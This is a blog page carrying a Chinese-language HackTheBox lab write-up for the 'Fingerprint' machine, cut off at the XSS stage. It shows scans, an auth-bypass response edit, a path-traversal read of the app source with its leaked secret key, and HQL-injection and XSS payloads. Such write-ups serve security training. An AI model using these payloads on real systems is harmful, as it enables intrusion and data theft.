

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="何语灵">
  <meta name="keywords" content="">
  
    <meta name="description" content="每周练手">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Fingerprint">
<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2022/06/06/HTB/Fingerprint/index.html">
<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
<meta property="og:description" content="每周练手">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://m0ck1ng-b1rd.github.io/img/example.jpg">
<meta property="article:published_time" content="2022-06-06T04:21:06.000Z">
<meta property="article:modified_time" content="2022-11-29T13:35:02.830Z">
<meta property="article:author" content="何语灵">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://m0ck1ng-b1rd.github.io/img/example.jpg">
  
  
  
  <title>HackTheBox - Fingerprint - M0cK1nG-b1Rd&#39;s site</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="//picbedddd.oss-cn-beijing.aliyuncs.com/blog/scripts/scroll.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>

  
<meta name="generator" content="Hexo 6.1.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>M0cK1nG-b1Rd&#39;s site</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HackTheBox - Fingerprint"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-06-06 12:21" pubdate>
          2022年6月6日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          23k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          188 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HackTheBox"
        id="heading-d9fb08be3ed131369df5d4aa808dac70" role="tab" data-toggle="collapse" href="#collapse-d9fb08be3ed131369df5d4aa808dac70"
        aria-expanded="true"
      >
        HackTheBox
        <span class="list-group-count">(18)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-d9fb08be3ed131369df5d4aa808dac70"
           role="tabpanel" aria-labelledby="heading-d9fb08be3ed131369df5d4aa808dac70">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - BountyHunter</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Cap</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Driver</span>
        </a>
      
    
      
      
        <a href="/2022/06/06/HTB/Fingerprint/" title="HackTheBox - Fingerprint"
           class="list-group-item list-group-item-action
           active">
          <span class="category-post">HackTheBox - Fingerprint</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Horizontall</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Intelligence/" title="HackTheBox - Intelligence"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Intelligence</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Monitors/" title="HackTheBox - Monitors"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Monitors</span>
        </a>
      
    
      
      
        <a href="/2022/05/27/HTB/Pandora/" title="HackTheBox - Pandora"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Pandora</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Previse/" title="HackTheBox - Previse"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Previse</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Schooled/" title="HackTheBox - Schooled"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Schooled</span>
        </a>
      
    
      
      
        <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Seal</span>
        </a>
      
    
      
      
        <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Shibboleth</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Sink</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Spider</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - StartingPoint-Archetype</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
        </a>
      
    
      
      
        <a href="/2022/05/19/HTB/Unicode/" title="HackTheBox - Unicode"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - Unicode</span>
        </a>
      
    
      
      
        <a href="/2021/12/07/HTB/dynstr/" title="HackTheBox - dynstr"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">HackTheBox - dynstr</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">HackTheBox - Fingerprint</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2022年11月29日 晚上
                  
                
              </p>
            
            <div class="markdown-body">
              
              <h1 id="0x01-Recon-amp-Foothold"><a href="#0x01-Recon-amp-Foothold" class="headerlink" title="0x01 Recon &amp; Foothold"></a>0x01 Recon &amp; Foothold</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -Pn -v <span class="hljs-number">10.10.11.127</span><br></code></pre></td></tr></table></figure>

<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT     STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey:<br>|   <span class="hljs-type">2048</span> <span class="hljs-number">90</span>:<span class="hljs-number">65</span>:<span class="hljs-number">07</span>:<span class="hljs-number">35</span>:be:<span class="hljs-number">8</span>d:<span class="hljs-number">7</span>b:ee:ff:<span class="hljs-number">3</span>a:<span class="hljs-number">11</span>:<span class="hljs-number">96</span>:<span class="hljs-number">06</span>:a9:a1:b9 (RSA)<br>|   <span class="hljs-type">256</span> <span class="hljs-number">4</span>c:<span class="hljs-number">5</span>b:<span class="hljs-number">74</span>:d9:<span class="hljs-number">3</span>c:c0:<span class="hljs-number">60</span>:<span class="hljs-number">24</span>:e4:<span class="hljs-number">95</span>:<span class="hljs-number">2</span>f:b0:<span class="hljs-number">51</span>:<span class="hljs-number">84</span>:<span class="hljs-number">03</span>:c5 (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">82</span>:f5:b0:d9:<span class="hljs-number">73</span>:<span class="hljs-number">18</span>:<span class="hljs-number">01</span>:<span class="hljs-number">47</span>:<span class="hljs-number">61</span>:f7:f6:<span class="hljs-number">26</span>:<span class="hljs-number">0</span>a:d5:cd:f2 (ED25519)<br><span class="hljs-number">80</span>/tcp   open  http    Werkzeug httpd <span class="hljs-number">1.0</span><span class="hljs-number">.1</span> (Python <span class="hljs-number">2.7</span><span class="hljs-number">.17</span>)<br>|<span class="hljs-type">_http</span>-title: mylog - Starting page<br>| <span class="hljs-type">http</span>-methods:<br>|<span class="hljs-type">_</span>  Supported Methods: HEAD OPTIONS GET<br>|<span class="hljs-type">_http</span>-server-header: Werkzeug/<span class="hljs-number">1.0</span><span class="hljs-number">.1</span> Python/<span class="hljs-number">2.7</span><span class="hljs-number">.17</span><br><span class="hljs-number">8080</span>/tcp open  http    Sun GlassFish <span class="hljs-keyword">Open</span> Source Edition  <span class="hljs-number">5.0</span><span class="hljs-number">.1</span><br>|<span class="hljs-type">_http</span>-title: secAUTH<br>| <span class="hljs-type">http</span>-methods:<br>|   <span class="hljs-type">Supported</span> Methods: GET HEAD POST PUT DELETE TRACE OPTIONS<br>|<span class="hljs-type">_</span>  Potentially risky methods: PUT DELETE TRACE<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>

<h2 id="site-80"><a href="#site-80" class="headerlink" title="site 80"></a>site 80</h2><p>访问站点能够发现一些信息，比如默认的<code>admin:admin</code>口令，以及网站后端是flask框架。</p>
<p><img src="/img/Fingerprint.assets/image-20220527192138309.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527192138309"></p>
<p>同时抓包也证实了这一点：</p>
<p><img src="/img/Fingerprint.assets/image-20220527190817136.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527190817136"></p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>扫描目录发现有一个<code>/admin</code>的端点，虽然是302跳转，但是返回的数据包大小反而比<code>/login</code>端点还要大。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">➤  feroxbuster --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span><br>[...]<br><span class="hljs-number">200</span>      GET      <span class="hljs-number">206</span>l      <span class="hljs-number">633</span>w    <span class="hljs-number">10916</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>/<br><span class="hljs-number">302</span>      GET       <span class="hljs-number">59</span>l      <span class="hljs-number">104</span>w     <span class="hljs-number">1574</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span><span class="hljs-regexp">/admin =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127/</span>login<br><span class="hljs-number">200</span>      GET       <span class="hljs-number">36</span>l       <span class="hljs-number">77</span>w      <span class="hljs-number">901</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>/login<br></code></pre></td></tr></table></figure>

<p>我们使用Burp将将返回数据包的<code>302 FOUND</code>改成<code>200 OK</code>。</p>
<p><img src="/img/Fingerprint.assets/image-20220527193848620.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527193848620"></p>
<p>再次访问界面，发现可以查看一个<code>auth.log</code>的访问日志文件。在8080端口的站点进行登录认证时，会在这个日志文件中生成访问记录，这个文件我们后面会用到。</p>
<p><img src="/img/Fingerprint.assets/image-20220527194557966.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527194557966"></p>
<p><img src="/img/Fingerprint.assets/image-20220527203929551.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527203929551"></p>
<h3 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h3><p>蓝色的查看按钮指向链接<code> /admin/view/auth.log</code>，对该端点进行测试，能够发现有路径穿越漏洞。</p>
<p><img src="/img/Fingerprint.assets/image-20220527195034574.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527195034574"></p>
<p>flask经典的启动文件名就是app.py了，我们紧接着访问<code>/admin/view/../../../../../proc/self/cwd/app.py</code>即可拿到flask文件。</p>
<p>文件里面只有一个<code>SECRET_KEY</code>是我们值得关注的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;SjG$g5VZ(vHC;M2Xc/2~z(&#x27;</span><br></code></pre></td></tr></table></figure>



<h2 id="site-8080"><a href="#site-8080" class="headerlink" title="site 8080"></a>site 8080</h2><p>随便发一个包看一下后端，是一个GlassFish的后端。</p>
<p><img src="/img/Fingerprint.assets/image-20220527191948250.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527191948250"></p>
<h3 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>扫描目录的结果也显示了这应该是一个Java Web网站：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">➤  feroxbuster --depth <span class="hljs-number">1</span> --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span>                                                     <br>[...]<br><span class="hljs-number">200</span>      GET      <span class="hljs-number">229</span>l      <span class="hljs-number">626</span>w    <span class="hljs-number">13020</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span>/<br><span class="hljs-number">200</span>      GET       <span class="hljs-number">72</span>l      <span class="hljs-number">113</span>w     <span class="hljs-number">1733</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span>/login<br><span class="hljs-number">405</span>      GET        <span class="hljs-number">1</span>l       <span class="hljs-number">74</span>w     <span class="hljs-number">1184</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span>/upload<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">185</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/resources =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>resources/<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">183</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/WEB-INF =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>WEB-INF/<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">183</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>backups/<br><span class="hljs-number">302</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">180</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/welcome =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>login<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">184</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/META-INF =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>META-INF/<br></code></pre></td></tr></table></figure>

<p>这个<code>backup</code>文件夹里应该是有东西的，结合这是一个<code>Java Web</code>网站，我们使用<code>-x</code>参数指定文件拓展名然后继续对<code>backup</code>文件夹进行扫描。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">➤  feroxbuster --depth <span class="hljs-number">1</span> --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups/</span> -x java,jsp,class<br><br>[...]<br><br><span class="hljs-number">200</span>      GET       <span class="hljs-number">54</span>l      <span class="hljs-number">122</span>w     <span class="hljs-number">1444</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups/</span>User.java<br><span class="hljs-number">200</span>      GET       <span class="hljs-number">43</span>l       <span class="hljs-number">99</span>w     <span class="hljs-number">1060</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups/</span>Profile.java<br><span class="hljs-number">401</span>      GET        <span class="hljs-number">1</span>l       <span class="hljs-number">52</span>w     <span class="hljs-number">1094</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups/</span>j_security_check<br></code></pre></td></tr></table></figure>



<h3 id="HQL注入"><a href="#HQL注入" class="headerlink" title="HQL注入"></a>HQL注入</h3><p>对登录过程进行抓包，发现除了常见的用户名密码外还有一个<code>auth_secondary</code>字段，且作了改动后服务器会返回<code>500 Internal Server Error</code>。</p>
<p><img src="/img/Fingerprint.assets/image-20220527200838766.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527200838766"></p>
<p>不过通过报错信息我们能够发现这个后端使用了Hibernate这样一个框架来作为ORM框架，与这个框架有关的就是HQL注入了。</p>
<p><img src="/img/Fingerprint.assets/image-20220527200951363.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527200951363"></p>
<p>尝试让单引号闭合，报错如下：</p>
<p><img src="/img/Fingerprint.assets/image-20220527202924349.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527202924349"></p>
<p>我们尝试让执行的HQL返回一条记录，比如使用这样一个payload：<code>&#39; or username=&#39;admin</code>。使用该payload可以看到服务器不再返回<code>500 Internal Server Error</code>的错误了，而是显示<code>Invalid fingerprint-ID</code>。我们再看看能不能绕过对<code>fingerprint-ID</code>的校验吧。</p>
<p><img src="/img/Fingerprint.assets/image-20220527202959824.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220527202959824"></p>
<p>在<code>/resources/js/login.js</code>端点下能够发现相关函数<code>getFingerPrintID</code>的定义。通览代码后不难发现这个<code>fingerprint</code>其实指代的就是浏览器的指纹。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getFingerPrintID</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> fingerprint = navigator.<span class="hljs-property">appCodeName</span> + navigator.<span class="hljs-property">appVersion</span> + (navigator.<span class="hljs-property">cookieEnabled</span> ? <span class="hljs-string">&quot;yes&quot;</span> : <span class="hljs-string">&quot;no&quot;</span>) + navigator.<span class="hljs-property">language</span> + navigator.<span class="hljs-property">platform</span> +<br>        navigator.<span class="hljs-property">productSub</span> + navigator.<span class="hljs-property">userAgent</span> + navigator.<span class="hljs-property">vendor</span> + screen.<span class="hljs-property">availWidth</span> + <span class="hljs-string">&quot;&quot;</span><br>        + screen.<span class="hljs-property">availHeight</span> + <span class="hljs-string">&quot;&quot;</span> + screen.<span class="hljs-property">width</span> + <span class="hljs-string">&quot;&quot;</span> + screen.<span class="hljs-property">height</span> + <span class="hljs-string">&quot;&quot;</span> +<br>        screen.<span class="hljs-property">orientation</span>.<span class="hljs-property">type</span> + <span class="hljs-string">&quot;&quot;</span> + screen.<span class="hljs-property">pixelDepth</span> + <span class="hljs-string">&quot;&quot;</span> + screen.<span class="hljs-property">colorDepth</span> +<br>        <span class="hljs-title class_">Intl</span>.<span class="hljs-title class_">DateTimeFormat</span>().<span class="hljs-title function_">resolvedOptions</span>().<span class="hljs-property">timeZone</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> plugin <span class="hljs-keyword">of</span> navigator.<span class="hljs-property">plugins</span>) &#123;<br>        fingerprint += plugin.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;,&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> mime <span class="hljs-keyword">of</span> navigator.<span class="hljs-property">mimeTypes</span>) &#123;<br>        fingerprint += mime.<span class="hljs-property">type</span> + <span class="hljs-string">&quot;,&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">MD5</span>(fingerprint)<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在浏览器的console界面可以查看这个<code>getFingerPrintID</code>使用的对象，以<code>navigator</code>为例，如下：</p>
<p><img src="/img/Fingerprint.assets/image-20220530154353233.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20220530154353233"></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>那现在看来就是这个登录界面通过对浏览器指纹进行识别做了白名单限制，亦即需要搞到一个合法的<code>fingerprint-ID</code>。</p>
<p>首先因为存在HQL注入，我们理论上可以通过HQL盲注来获取<code>fingerprint-ID</code>，这是第一种方案；</p>
<p>但是在接下来的测试中我们发现有XSS，还记得一开始我们提到的<code>auth.log</code>吗，我们输入任意XSS payload，比如经典的<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，在80端口查看<code>auth.log</code>，如下：</p>
